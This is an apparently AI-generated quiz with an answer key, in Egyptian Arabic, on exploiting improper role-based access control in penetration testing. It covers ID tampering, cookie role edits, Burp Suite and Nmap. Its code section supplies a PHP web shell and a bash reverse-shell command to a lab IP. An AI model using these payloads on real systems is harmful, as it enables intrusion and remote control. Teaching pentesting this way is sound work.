إليك الأسئلة مع الإجابات مباشرة بعد كل سؤال، مع زيادة أسئلة الفهم العميق المبنية على سيناريوهات واقعية كما طلبت، وفي جزء الخلاصة السؤال هيكون "قولي الخلاصة بتاعت الجزء":

---

### **أسئلة إكمال الفراغات**
1. Improper RBAC يعني إن نظام التحكم في الوصول بيعتمد على الأدوار معمول بشكل ______.  
   **غلط أو ضعيف**

2. المهاجم يقدر يوصل لحاجات خارج دوره لو ما اتعملش ______ من دور المستخدم.  
   **تحقق**

3. لو لقيت رابط زي `/api/users/123`، ممكن تغير الـ ______ عشان تشوف بيانات حد تاني.  
   **ID**

4. أداة ______ بتساعدك تعترض طلبات الـ API وتعدلها عشان تستغل ضعف RBAC.  
   **Burp Suite**

5. لو وصلت لـ Shell من استغلال RBAC، ممكن تستخدم أمر ______ عشان تصعد لـ Root.  
   **sudo -l**

---

### **أسئلة صح وغلط**
6. Improper RBAC بيخلّي مستخدم عادي يتحكم في النظام كله دايمًا. (صح/غلط)  
   **غلط** - بيعتمد على مدى الضعف، ممكن يكون أفقي أو عمودي.

7. تغيير الـ Cookie من `role=user` لـ `role=admin` ممكن يديك وصول لصفحة Admin لو RBAC ضعيف. (صح/غلط)  
   **صح**

8. الثغرة دي مش خطيرة لو ما قدرتش تسرق بيانات حساسة. (صح/غلط)  
   **غلط** - حتى لو مش بيانات، ممكن تخرب أو تصعد صلاحيات.

9. Nmap بيستخدم لاختبار ضعف RBAC في الـ API مباشرة. (صح/غلط)  
   **غلط** - Nmap بيفحص الخدمات، مش بيختبر RBAC.

10. في الـ Pentesting، لازم توثق كل استغلال لـ RBAC في التقرير. (صح/غلط)  
    **صح**

---

### **أسئلة اختيار من متعدد**
11. إيه السبب الرئيسي لضعف RBAC في نظام؟  
    أ) سوء تصميم الصلاحيات  
    ب) تحديثات قديمة  
    ج) غلط في البرمجة فقط  
    د) استخدام كلمات سر قوية  
    **أ) سوء تصميم الصلاحيات**

12. إيه الأداة اللي بتستخدمها عشان تفحص خدمات الهدف في الخطوة الأولى؟  
    أ) Burp Suite  
    ب) Nmap  
    ج) Gobuster  
    د) curl  
    **ب) Nmap**

13. إيه اللي ممكن يحصل لو استغليت Improper RBAC بنجاح؟  
    أ) تصعيد أفقي  
    ب) تصعيد عمودي  
    ج) سرقة بيانات  
    د) كل اللي فوق  
    **د) كل اللي فوق**

14. إيه اللي بيخلّي مستخدم عادي يوصل لصلاحيات Admin في Improper RBAC؟  
    أ) عدم التحقق من الدور  
    ب) تحديث النظام  
    ج) حماية قوية  
    د) غلق المنافذ  
    **أ) عدم التحقق من الدور**

15. إيه الأمر اللي بيوريك إذا كنت تقدر تصعد صلاحياتك في الـ Shell؟  
    أ) id  
    ب) whoami  
    ج) sudo -l  
    د) uname -r  
    **ج) sudo -l**

---

### **أسئلة "لماذا" لتفسير المفاهيم**
16. ليه Improper RBAC بيعتبر ثغرة أمنية؟  
    **لأنه بيسمح للمستخدم يتجاوز دوره ويعمل حاجات المفروض ممنوعة عليه.**

17. ليه المهاجم بيجرب يغير الـ ID في الرابط زي `/api/users/123`؟  
    **عشان يشوف لو بيانات مستخدم تاني متاحة ويتأكد إن RBAC ضعيف.**

18. ليه الثغرة دي بتكون خطيرة حتى لو ما وصلتش لـ Root؟  
    **لأنها ممكن تسمح بسرقة بيانات أو تخريب حتى لو أفقي بس.**

19. ليه الـ Pentester بيستخدم Burp Suite في اختبار RBAC؟  
    **عشان يعترض الطلبات ويعدلها بسهولة ويشوف لو النظام بيتحقق من الدور أو لا.**

20. ليه تصعيد الصلاحيات من RBAC بيعتبر ذهب في الـ Pentesting؟  
    **لأنه بيديك وصول كبير بمجهود قليل لو النظام ضعيف.**

---

### **أسئلة ربط المفاهيم ببعضها**
21. إزاي تربط بين سوء تصميم الصلاحيات وImproper RBAC؟  
    **سوء التصميم بيخلّي المستخدم يقدر يعمل حاجات خارج دوره بسبب غياب التحقق.**

22. إيه العلاقة بين Improper RBAC وتصعيد أفقي؟  
    **بتسمح لمستخدم عادي يشوف أو يعدل بيانات مستخدم تاني بنفس المستوى.**

23. إزاي Nmap بيساعدك في استغلال Improper RBAC؟  
    **بيكشف الخدمات زي Apache اللي ممكن تحتوي على روابط أو API ضعيفة.**

24. إزاي تغيير الـ Cookie بيساعدك تستغل Improper RBAC؟  
    **بتغير الدور في الـ Cookie من User لـ Admin وتوصل لصفحات ممنوعة.**

25. إيه الرابط بين استغلال الـ API وضعف RBAC؟  
    **الـ API لو ما بيتحققش من الدور بيديك وصول لحاجات خارج صلاحيتك.**

---

### **أسئلة للفهم (عميقة من سيناريوهات واقعية)**
26. لو كنت موظف في شركة ولقيت إنك تقدر تشوف رواتب زمايلك من حسابك العادي، إيه اللي حصل في النظام؟  
    **RBAC ضعيف، لأنه المفروض ما يسمحلكش تشوف بيانات خارج دورك كموظف عادي.**

27. لو موقع تسوق أونلاين سمحلك كـ User تغير سعر منتج من الرابط بتاعك، إزاي ده بيحصل؟  
    **Improper RBAC بيخلّي النظام ينفذ التعديل من غير ما يتحقق إنك مش Admin.**

28. تخيل إنك في بنك ولقيت إنك تقدر تضيف حساب جديد من حسابك العادي، إيه اللي يخلّي ده ممكن؟  
    **عدم التحقق من الدور في RBAC بيسمحلك تعمل حاجات المفروض للأدمن بس.**

29. لو كنت طالب في منصة تعليمية وعدلت درجاتك من حسابك، إزاي النظام سمح بكده؟  
    **RBAC مضروب لأنه ما حطش حدود واضحة بين دور الطالب والأدمن.**

30. لو شركة شحن سمحت لك كـ User تشوف عناوين العملاء التانيين بتغيير الـ ID، إيه اللي ضايع في النظام؟  
    **التحقق من صلاحيات الدور في RBAC، فبقى أي حد يقدر يوصل لبيانات خارج دوره.**

31. تخيل إنك في لعبة أونلاين ولقيت إنك تقدر تفتح إعدادات المطور من حسابك العادي، إزاي ده بيحصل؟  
    **Improper RBAC بيسمحلك تتخطى حدود دورك وتوصل لصلاحيات أعلى.**

32. لو موقع شغل سمح لك كـ موظف عادي تمسح طلبات العملاء من الـ API، إيه اللي ممكن يكون السبب؟  
    **ضعف RBAC بيخلّي الـ API ينفذ الأوامر بدون ما يتأكد إنك Admin.**

33. لو كنت عميل في موقع ولقيت إنك تقدر تضيف خصم لحسابك بتغيير الـ Cookie، إزاي ده واقعي؟  
    **النظام ما بيتحققش من الدور في الـ Cookie، فبيسمحلك تعمل حاجات زي الأدمن.**

34. تخيل إنك في نظام مستشفى ولقيت إنك تقدر تشوف تقارير مرضى تانيين كمريض عادي، إيه اللي غلط؟  
    **RBAC ضعيف بيسمح بتصعيد أفقي لأنه ما بيحددش الوصول صح.**

35. لو كنت في موقع حكومي وعدلت بيانات مواطن تاني من حسابك، إزاي النظام سمح بكده؟  
    **Improper RBAC بيفتقر للتحقق من الدور، فبيخلّيك تتجاوز صلاحياتك بسهولة.**

---

### **أسئلة كتابة كود**
36. اكتب رابط يدوي عشان تختبر ضعف RBAC بتغيير الـ ID.  
    **http://target.com/profile?id=1**

37. اكتب أمر Nmap عشان تفحص الهدف في الخطوة الأولى.  
    **nmap -sV 192.168.1.10**

38. اكتب كود PHP بسيط ترفعه لو وصلت لـ Upload في صفحة Admin.  
    **<?php system($_GET['cmd']); ?>**

39. اكتب طلب API معدل في Burp عشان تستغل ضعف RBAC أفقيًا.  
    **GET /api/users/1 HTTP/1.1  
    Host: 192.168.1.10**

40. اكتب أمر في الـ Shell عشان تاخد Shell تفاعلي بعد رفع ملف PHP.  
    **http://192.168.1.10/admin/shell.php?cmd=/bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1**

---

### **أسئلة الخلاصة**
41. قولي الخلاصة بتاعت الجزء الأول ("إيه هو Improper Role-Based Access Control (RBAC)؟").  
    **"يعني زي ما تكون حاطط ناس في أوض مختلفة في البيت، بس سايب الأبواب مفتوحة، فالكل يقدر يخش أي حتة! Improper RBAC يعني كل واحد يعمل اللي عايزه من غير ما حد يقوله لأ."**

42. قولي الخلاصة بتاعت الجزء التاني ("ليه المشكلة دي خطيرة؟").  
    **"المشكلة خطيرة لأنها زي ما تكون حاطط حارس بس نايم، أي حد يقدر يعدي وياخد اللي عايزه! المهاجم يلاقي الثغرة دي، يبقى الباشا بتاع الموقع على طول."**

43. قولي الخلاصة بتاعت الجزء التالت ("إزاي نستغلها في الـ Pentesting؟").  
    **"لما تلاقي RBAC ضعيف، زي ما تكون لقيت خرم في الحيطة، تدخل منه وتبقى الكبير بتاع اللعبة من غير ما حد يحس!"**

44. قولي الخلاصة بتاعت الجزء الرابع ("خطوات عملية للاستغلال في Pentesting").  
    **"الخطوات دي زي ما تكون لقيت بيت الأدوار فيه مفتوحة، خشيت من أوضة صغيرة، لعبته في الكبيرة، وطلعت الكبير بتاع الحتة! RBAC لما يكون ضعيف، يبقى طريقك للفوز بسهولة."**

45. قولي الخلاصة النهائية بتاعت النص كله.  
    **"Improper Role-Based Access Control هي ثغرة كبيرة لأنها بتخلّي المستخدم يتجاوز دوره ويوصل لأماكن أو صلاحيات المفروض ممنوعة. في الـ Pentesting، دور على الضعف ده في الروابط، الـ API، أو الكوكيز، استغله عشان تاخد بيانات أو Shell، ووري العميل إن نظامه زي لعبة مفتوحة للكل! بالطريقة دي، تبقى البطل بتاع الساحة بكل سهولة!"**

---

كده الأسئلة مغطية النص كامل، مع زيادة في أسئلة الفهم العميق (من 26 لـ 35) مبنية على سيناريوهات واقعية زي شركات، بنوك، مواقع تسوق، وأنظمة حكومية عشان تفهم الموضوع في سياقات حقيقية. لو عايز أي زيادة أو تعديل، قول لي!